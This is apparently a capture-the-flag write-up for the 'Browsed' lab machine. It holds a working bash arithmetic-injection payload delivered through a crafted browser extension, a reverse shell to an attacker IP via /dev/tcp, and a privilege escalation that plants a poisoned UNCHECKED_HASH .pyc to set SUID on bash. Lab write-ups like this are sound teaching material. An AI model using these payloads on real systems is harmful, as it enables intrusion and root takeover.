Browsed

Machine IP: 10.129.4.147 (RA)

Difficulty: Medium, OS: Linux, Creator: Tensho

Throughout the error message, the URL http://browsedinternals.htb/ keeps getting mentioned. We can add that to our /etc/hosts and visit it.

Gitea​

Visiting browsedinternals.htb leads us to a gitea page with source code of a markdown preview app. In one of the logs we can find a username in the target machine: larry.

Additionally, the app seems to be hosted on port 5000 of the machine and only accessible by localhost:

Onto the interesting stuff now. There is an endpoint called routines:

@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"

Which seems to run the script routines.sh with the rid as argument. We could suspect a command injection with the rid but unfortunately subprocess.run() in python runs with shell=False by default, so that’s out of the table. This is routines.sh:

#!/bin/bash
[--SNIP--]

if [[ "$1" -eq 0 ]]; then
  # Routine 0: Clean temp files
[--SNIP--]

elif [[ "$1" -eq 1 ]]; then
  # Routine 1: Backup data
[--SNIP--]

elif [[ "$1" -eq 2 ]]; then
  # Routine 2: Rotate logs
[--SNIP--]

elif [[ "$1" -eq 3 ]]; then
  # Routine 3: System info dump
[--SNIP--]

It is a bash script, and it tries to compare the first argument with 0, 1, 2 and 3 arithmetically (notice the double square brackets [[ ]] ). This is exploitable with command substitution since we control the first argument through the endpoint. So, all we need to do is create an extension that calls to this endpoint with an injection in the RID part.

First, let’s copy over the manifest.json from one of the samples given to us and make some changes to it so that we can use it to contact the internal service:

{
  "manifest_version": 3,
  "name": "Replace Images",
  "version": "1.0.0",
  "description": "Replaces every image on a page with one from a URL.",
  "permissions": ["scripting"],
  "host_permissions": [
  "http://127.0.0.1/*"
  ],
  "background": {
    "service_worker": "background.js"
  }
}

The first part is kept the same but we also need to add the host_permissions so that it can access the internal site http://127.0.0.1/ (where the markdown preview service is hosted).

Now we need a background.js file. If we try using a plain URL-encoded reverse shell:

// Bash arithmetic injection
const payload = "a[$(bash 'bash -i >&/dev/tcp/10.10.14.129/1234 0>&1')]";

const targetUrl = `http://127.0.0.1:5000/routines/${encodeURIComponent(payload)}`;

fetch(targetUrl)

// Doesn't work

It doesn’t do anything. Let’s encode it in b64:

const payload = "a[$(echo b64BlobHere | base64 -d | bash)]";

const targetUrl = `http://127.0.0.1:5000/routines/${encodeURIComponent(payload)}`;

fetch(targetUrl)

Save it, zip it up along with manifest.json and upload it. This will get us a reverse shell as the user larry who also has the user flag in his home directory.

Let’s explain the payload a bit further. What did we actually do? Well, we passed as an argument in the command an array called a[] whose index was a command, so it ran that subcommand to find the index, but that subcommand doesn’t lead to an index, it is actually just a reverse shell.

PrivEsc​

If we run sudo -l we can see that we are allowed to run a python script as sudo:

In that folder we can see there are 2 scripts and a pycache directory

We can see that extension_tool.py imports 2 functions from extension_utils.py :

#!/usr/bin/python3.12
import json
import os
from argparse import ArgumentParser
**from extension_utils import validate_manifest, clean_temp_files**
import zipfile

[--SNIP--]

However, we saw earlier the permissions of pycache: drwxrwxrwx. This means it is world-writeable, which means we could import a module from there. Python caches compiled bytecode in pycache for faster loading, so we can make a malicious one ourselves and place it there.

First, let’s make the malicious extension_utils.py file, since we will need to include the functions that the original script is importing to avoid errors:

import os

def validate_manifest(path):
    os.system("bash -c 'chmod +s /bin/bash'")

def clean_temp_files(extension_dir):
    os.system("bash -c 'chmod +s /bin/bash'")

If any of them is called, bash will get the SUID bit. Now we need to compile that. Keep in mind, we saw from the shebang that the script is running on python3.12. So we use that to compile it: python3.12 -m py_compile evil.py . This will create another pycache directory so we just move the pyc file out of there and into the original pycache.

If we run the original script, we see the pyc file that is created inside pycache:

-rw-r--r-- 1 root root 1880 Jan 11 15:52 extension_utils.cpython-312.pyc

So we need to name our bytecode file the same way. We just rename the file and then we run the script. Once one of the 2 functions get triggered, bash should have the SUID bit set:

But it didn’t work… After a bit of digging, turns out there was another thing overlooked.

UNCHECKED_HASH​

Normally, Python checks if the .pyc file matches the .py source file (checks timestamp or hash). With UNCHECKED_HASH, Python loads the .pyc file without checking if it matches the source. This means our malicious bytecode will be loaded even though we don't control the original extension_utils.py. So we actually need to compile it this way:

import py_compile
py_compile.compile(
    'evil.py',                                          # Name of our file
    cfile='extension_utils.cpython-312.pyc',            # Name of output file
    doraise=True,                                       # Raise an exception if it errors
    **invalidation_mode=PycInvalidationMode.UNCHECKED_HASH**         # Don't check hash
)

or in a one-liner:

python3.12 -c "import py_compile;py_compile.compile('evil.py', cfile='extension_utils.cpython-312.pyc', doraise=True, invalidation_mode=py_compile.PycInvalidationMode.UNCHECKED_HASH)"

This should generate the pyc we need, meaning if we run the script:

Bash has now the SUID bit set, so we just run bash -p and get a root shell!

Decent box overall. User was pretty easy and root was a bit tougher but manageable still.
